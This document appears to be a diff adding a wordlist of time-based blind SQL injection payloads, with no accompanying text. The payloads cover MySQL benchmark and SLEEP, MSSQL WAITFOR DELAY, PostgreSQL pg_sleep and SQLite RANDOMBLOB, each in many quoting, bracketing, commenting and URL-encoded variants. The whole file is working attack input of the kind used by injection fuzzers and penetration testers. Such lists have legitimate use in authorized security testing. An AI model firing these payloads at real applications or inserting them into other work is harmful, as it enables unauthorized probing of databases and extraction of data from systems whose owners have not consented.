+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+ and 0=benchmark(3000000,MD5(1))%20/*
+ and 0=benchmark(3000000,MD5(1))%20--
+ and 0=benchmark(3000000,MD5(1))%20%23
+' and 0=benchmark(3000000,MD5(1))%20/*
+' and 0=benchmark(3000000,MD5(1))%20--
+' and 0=benchmark(3000000,MD5(1))%20%23
+" and 0=benchmark(3000000,MD5(1))%20/*
+" and 0=benchmark(3000000,MD5(1))%20--
+" and 0=benchmark(3000000,MD5(1))%20%23
+) and 0=benchmark(3000000,MD5(1))%20/*
+) and 0=benchmark(3000000,MD5(1))%20--
+) and 0=benchmark(3000000,MD5(1))%20%23
+)) and 0=benchmark(3000000,MD5(1))%20/*
+)) and 0=benchmark(3000000,MD5(1))%20--
+)) and 0=benchmark(3000000,MD5(1))%20%23
+))) and 0=benchmark(3000000,MD5(1))%20/*
+))) and 0=benchmark(3000000,MD5(1))%20--
+))) and 0=benchmark(3000000,MD5(1))%20%23
+)))) and 0=benchmark(3000000,MD5(1))%20/*
+)))) and 0=benchmark(3000000,MD5(1))%20--
+)))) and 0=benchmark(3000000,MD5(1))%20%23
+') and 0=benchmark(3000000,MD5(1))%20/*
+') and 0=benchmark(3000000,MD5(1))%20--
+') and 0=benchmark(3000000,MD5(1))%20%23
+") and 0=benchmark(3000000,MD5(1))%20/*
+") and 0=benchmark(3000000,MD5(1))%20--
+") and 0=benchmark(3000000,MD5(1))%20%23
+')) and 0=benchmark(3000000,MD5(1))%20/*
+')) and 0=benchmark(3000000,MD5(1))%20--
+')) and 0=benchmark(3000000,MD5(1))%20%23
+")) and 0=benchmark(3000000,MD5(1))%20/*
+")) and 0=benchmark(3000000,MD5(1))%20--
+")) and 0=benchmark(3000000,MD5(1))%20%23
+'))) and 0=benchmark(3000000,MD5(1))%20/*
+'))) and 0=benchmark(3000000,MD5(1))%20--
+'))) and 0=benchmark(3000000,MD5(1))%20%23
+"))) and 0=benchmark(3000000,MD5(1))%20/*
+"))) and 0=benchmark(3000000,MD5(1))%20--
+"))) and 0=benchmark(3000000,MD5(1))%20%23
+')))) and 0=benchmark(3000000,MD5(1))%20/*
+')))) and 0=benchmark(3000000,MD5(1))%20--
+')))) and 0=benchmark(3000000,MD5(1))%20%23
+")))) and 0=benchmark(3000000,MD5(1))%20/*
+")))) and 0=benchmark(3000000,MD5(1))%20--
+")))) and 0=benchmark(3000000,MD5(1))%20%23
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+'\"
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
++ SLEEP(10) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+ waitfor delay '0:0:20' /* 
+ waitfor delay '0:0:20' --
+' waitfor delay '0:0:20' /* 
+' waitfor delay '0:0:20' --
+" waitfor delay '0:0:20' /* 
+" waitfor delay '0:0:20' --
+) waitfor delay '0:0:20' /* 
+) waitfor delay '0:0:20' --
+)) waitfor delay '0:0:20' /* 
+)) waitfor delay '0:0:20' --
+))) waitfor delay '0:0:20' /* 
+))) waitfor delay '0:0:20' --
+)))) waitfor delay '0:0:20' /* 
+)))) waitfor delay '0:0:20' --
+))))) waitfor delay '0:0:20' --
+)))))) waitfor delay '0:0:20' --
+') waitfor delay '0:0:20' /* 
+') waitfor delay '0:0:20' --
+") waitfor delay '0:0:20' /* 
+") waitfor delay '0:0:20' --
+')) waitfor delay '0:0:20' /* 
+')) waitfor delay '0:0:20' --
+")) waitfor delay '0:0:20' /* 
+")) waitfor delay '0:0:20' --
+'))) waitfor delay '0:0:20' /* 
+'))) waitfor delay '0:0:20' --
+"))) waitfor delay '0:0:20' /* 
+"))) waitfor delay '0:0:20' --
+')))) waitfor delay '0:0:20' /* 
+')))) waitfor delay '0:0:20' --
+")))) waitfor delay '0:0:20' /* 
+")))) waitfor delay '0:0:20' --
+'))))) waitfor delay '0:0:20' /* 
+'))))) waitfor delay '0:0:20' --
+"))))) waitfor delay '0:0:20' /* 
+"))))) waitfor delay '0:0:20' --
+')))))) waitfor delay '0:0:20' /* 
+')))))) waitfor delay '0:0:20' --
+")))))) waitfor delay '0:0:20' /* 
+")))))) waitfor delay '0:0:20' --
+1';+waitfor+delay+'0:0:5'+-+
+'+AND+(SELECT+6377+FROM+(SELECT(SLEEP(5)))hLTl)--
+'+WAITFOR+DELAY+'0:0:5'--
+';WAITFOR+DELAY+'0:0:5'--
+'))+or+sleep(5)='
+;waitfor+delay+'0:0:5'--
+);waitfor+delay+'0:0:5'--
+';waitfor+delay+'0:0:5'--
+";waitfor+delay+'0:0:5'--
+');waitfor+delay+'0:0:5'--
+");waitfor+delay+'0:0:5'--
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'+
+'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
+'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'+
+'xor(if(now()=sysdate(),sleep(10),0))or'
++or+sleep(0.000000001)
++AND+SLEEP(15)
+%20AND%20SLEEP(15)
+%2c(select*from(select(sleep(30)))a)
+-sleep(5)
+-benchmark(1000000000,1-1)+
+'%2b(select*from(select(sleep(2)))a)%2b'
+'+(select*from(select(sleep(2)))a)+'
+'%2bIF(MID(@@version,1,1)=4,sleep(2),1)=2%2b'
+'+IF(MID(@@version,1,1)=4,sleep(2),1)=2+'
+(select(0)from(select(sleep(25)))v)
+-sleep/*f*/(10)
+-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0
+-if(mid(version/*f*/(),1,1)=4,sleep/*f*/(5),0)
+';SELECT+1;SELECT+pg_sleep\(30\);--'
+%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
+AND+SLEEP(7)#+,+%20AND%20SLEEP(7)%23
++AND+SLEEP(7)#
+%20SLEEP(7)%23
+SELECT+*FROM+(SELECT(SLEEP(5)))a)
+'=sleep(10)='1
+'=IF(MID(VERSION(),1,1)=1,SLEEP(10),0)='1
+'=IF(MID(VERSION(),1,1)=5,SLEEP(10),0)='1
+(select*from(select(sleep(5)))a)
+SLEEP(25)
++or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A))
++or+1=((SELECT+1+FROM+(SELECT+SLEEP(25))A))
+'%2b(select*from(select(sleep(3)))a)%2b'
+'%2b(select*from(select(sleep(0)))a)%2b
+'+or+sleep(5)+#+
+/*'XOR(if(2=2,sleep(10),0))OR'
+%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(1)))WUeh)
+if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0)+and+1=1)"/
+AND+(SELECT+*FROM+(SELECT(SLEEP(1)))WUeh)
+pg_sleep(30)--
+%2c(select*from(select(sleep(30)))a)++
+-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
+));waitfor+delay+'0:0:5'--
+";waitfor+delay+'0:0:__TIME_
+;waitfor+delay+'0:0:__TIME__'--
+");waitfor+delay+'0:0:__TIME__'--
+'%20and%20(select%20*%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20;
+'%2bbenchmark(10000000%2csha1(1))%2b'
+'%2%20and%20+if(substring(user(),1,1)='c',SLEEP(3),1)%2b'
+"))+or+sleep(__TIME__)="
+")+or+pg_sleep(__TIME__)--
+1+or+pg_sleep(__TIME__)--
+))+or+pg_sleep(__TIME__)--
+1))+or+sleep(__TIME__)#
+))+or+sleep(__TIME__)='
+"))+or+pg_sleep(__TIME__)--
+'))+or+sleep(5)='
+;waitfor+delay+'0:0:5'--
+);waitfor+delay+'0:0:5'--
+';waitfor+delay+'0:0:5'--
+";waitfor+delay+'0:0:5'--
+');waitfor+delay+'0:0:5'--
+");waitfor+delay+'0:0:5'--
+));waitfor+delay+'0:0:5'--
+"+or+sleep(__TIME__)#
+pg_sleep(__TIME__)--
+1)+or+sleep(__TIME__)#
+1+waitfor+delay+'0:0:10'--
+));waitfor+delay+'0:0:__TIME__'--
+a'+waitfor+delay+'0:0:10'--
+1+or+sleep(__TIME__)#
+"+or+pg_sleep(__TIME__)--
+%20'sleep%2050'
+1))+or+pg_sleep(__TIME__)--
+or+sleep(__TIME__)='
++or+pg_sleep(__TIME__)--
+")+or+sleep(__TIME__)="
+)+or+pg_sleep(__TIME__)--
+or+sleep(__TIME__)#
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'+
+'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'
++or+sleep(0.000000001)
+%20AND%20SLEEP(5)+
+-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))
+%2c(select*from(select(sleep(30)))
+-sleep(5)+
+'%2bIF(MID(@@version,1,1)=4,sleep(2),1)=2%2b'
+'%2b(select*from(select(sleep(2)))a)%2b'
+pg_sleep(30)--
+(select(0)from(select(sleep(25)))v)+
+-sleep/*f*/(10)
+-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)+
+';SELECT+1;SELECT+pg_sleep\(30\);--'
+%20AND%20SLEEP(7)%23
+(SELECT+*FROM+(SELECT(SLEEP(5)))a)
+'xor(if(now()=sysdate(),sleep(10),0))or'
+'xor(if(mid(database(),1,1)=0x41,sleep(63),0))or'+
++or+sleep(0.000000001)
+%20AND%20SLEEP(15)
+-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))
+%2c(select*from(select(sleep(30)))a)
+sleep(5)#
+1+or+sleep(5)#
+"+or+sleep(5)#
+'+or+sleep(5)#
+"+or+sleep(5)="
+'+or+sleep(5)='
+1)+or+sleep(5)#
+")+or+sleep(5)="
+')+or+sleep(5)='
+1))+or+sleep(5)#
+"))+or+sleep(5)="
+'))+or+sleep(5)='
+;waitfor+delay+'0:0:5'--
+);waitfor+delay+'0:0:5'--
+';waitfor+delay+'0:0:5'--
+";waitfor+delay+'0:0:5'--
+');waitfor+delay+'0:0:5'--
+");waitfor+delay+'0:0:5'--
+));waitfor+delay+'0:0:5'--
+'));waitfor+delay+'0:0:5'--
+"));waitfor+delay+'0:0:5'--
+benchmark(10000000,MD5(1))#
+1+or+benchmark(10000000,MD5(1))#
+"+or+benchmark(10000000,MD5(1))#
+'+or+benchmark(10000000,MD5(1))#
+1)+or+benchmark(10000000,MD5(1))#
+")+or+benchmark(10000000,MD5(1))#
+')+or+benchmark(10000000,MD5(1))#
+1))+or+benchmark(10000000,MD5(1))#
+"))+or+benchmark(10000000,MD5(1))#
+'))+or+benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1+or+pg_sleep(5)--
+"+or+pg_sleep(5)--
+'+or+pg_sleep(5)--
+1)+or+pg_sleep(5)--
+")+or+pg_sleep(5)--
+')+or+pg_sleep(5)--
+1))+or+pg_sleep(5)--
+"))+or+pg_sleep(5)--
+'))+or+pg_sleep(5)--
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))bAKL)+AND+'vRxe'='vRxe
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))YjoC)+AND+'%'='
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))nQIP)
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))nQIP)--
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or+SLEEP(5)
+or+SLEEP(5)#
+or+SLEEP(5)--
+or+SLEEP(5)="
+or+SLEEP(5)='
+waitfor+delay+'00:00:05'
+waitfor+delay+'00:00:05'--
+waitfor+delay+'00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or+benchmark(50000000,MD5(1))
+or+benchmark(50000000,MD5(1))--
+or+benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or+pg_SLEEP(5)
+or+pg_SLEEP(5)--
+or+pg_SLEEP(5)#
+'\"
+AnD+SLEEP(5)
+AnD+SLEEP(5)--
+AnD+SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+'+AnD+SLEEP(5)+ANd+'1
+'&&SLEEP(5)&&'1
+ORDER+BY+SLEEP(5)
+ORDER+BY+SLEEP(5)--
+ORDER+BY+SLEEP(5)#
+(SELECT+*FROM+(SELECT(SLEEP(5)))ecMj)
+(SELECT+*FROM+(SELECT(SLEEP(5)))ecMj)#
+(SELECT+*FROM+(SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
+++SLEEP(10)+++'
+RANDOMBLOB(500000000/2)
+AND+2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR+2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND+2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR+2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*'+or+SLEEP(1)+or+'"+or+SLEEP(1)+or+"*/
+sleep(5)#
+1+or+sleep(5)#
+"+or+sleep(5)#
+'+or+sleep(5)#
+"+or+sleep(5)="
+'+or+sleep(5)='
+1)+or+sleep(5)#
+")+or+sleep(5)="
+')+or+sleep(5)='
+1))+or+sleep(5)#
+"))+or+sleep(5)="
+'))+or+sleep(5)='
+;waitfor+delay+'0:0:5'--
+);waitfor+delay+'0:0:5'--
+';waitfor+delay+'0:0:5'--
+";waitfor+delay+'0:0:5'--
+');waitfor+delay+'0:0:5'--
+");waitfor+delay+'0:0:5'--
+));waitfor+delay+'0:0:5'--
+'));waitfor+delay+'0:0:5'--
+"));waitfor+delay+'0:0:5'--
+benchmark(10000000,MD5(1))#
+1+or+benchmark(10000000,MD5(1))#
+"+or+benchmark(10000000,MD5(1))#
+'+or+benchmark(10000000,MD5(1))#
+1)+or+benchmark(10000000,MD5(1))#
+")+or+benchmark(10000000,MD5(1))#
+')+or+benchmark(10000000,MD5(1))#
+1))+or+benchmark(10000000,MD5(1))#
+"))+or+benchmark(10000000,MD5(1))#
+'))+or+benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1+or+pg_sleep(5)--
+"+or+pg_sleep(5)--
+'+or+pg_sleep(5)--
+1)+or+pg_sleep(5)--
+")+or+pg_sleep(5)--
+')+or+pg_sleep(5)--
+1))+or+pg_sleep(5)--
+"))+or+pg_sleep(5)--
+'))+or+pg_sleep(5)--
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))bAKL)+AND+'vRxe'='vRxe
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))YjoC)+AND+'%'='
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))nQIP)
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))nQIP)--
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or+SLEEP(5)
+or+SLEEP(5)#
+or+SLEEP(5)--
+or+SLEEP(5)="
+or+SLEEP(5)='
+waitfor+delay+'00:00:05'
+waitfor+delay+'00:00:05'--
+waitfor+delay+'00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or+benchmark(50000000,MD5(1))
+or+benchmark(50000000,MD5(1))--
+or+benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or+pg_SLEEP(5)
+or+pg_SLEEP(5)--
+or+pg_SLEEP(5)#
+'\"
+AnD+SLEEP(5)
+AnD+SLEEP(5)--
+AnD+SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+'+AnD+SLEEP(5)+ANd+'1
+'&&SLEEP(5)&&'1
+ORDER+BY+SLEEP(5)
+ORDER+BY+SLEEP(5)--
+ORDER+BY+SLEEP(5)#
+(SELECT+*FROM+(SELECT(SLEEP(5)))ecMj)
+(SELECT+*FROM+(SELECT(SLEEP(5)))ecMj)#
+(SELECT+*FROM+(SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
+++SLEEP(10)+++'
+RANDOMBLOB(500000000/2)
+AND+2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR+2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND+2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR+2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*'+or+SLEEP(1)+or+'"+or+SLEEP(1)+or+"*/
+)%20waitfor%20delay%20'0:0:20'%20/*
+)%20waitfor%20delay%20'0:0:20'%20--
+')%20waitfor%20delay%20'0:0:20'%20/*
+')%20waitfor%20delay%20'0:0:20'%20--
+")%20waitfor%20delay%20'0:0:20'%20/*
+")%20waitfor%20delay%20'0:0:20'%20--
+))%20waitfor%20delay%20'0:0:20'%20/*
+))%20waitfor%20delay%20'0:0:20'%20--
+'))%20waitfor%20delay%20'0:0:20'%20/*
+'))%20waitfor%20delay%20'0:0:20'%20--
+"))%20waitfor%20delay%20'0:0:20'%20/*
+"))%20waitfor%20delay%20'0:0:20'%20--
+,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL)%20waifor%20delay%20'0:0:20'%20/*
+',NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL)%20waifor%20delay%20'0:0:20'%20/*
+'),NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
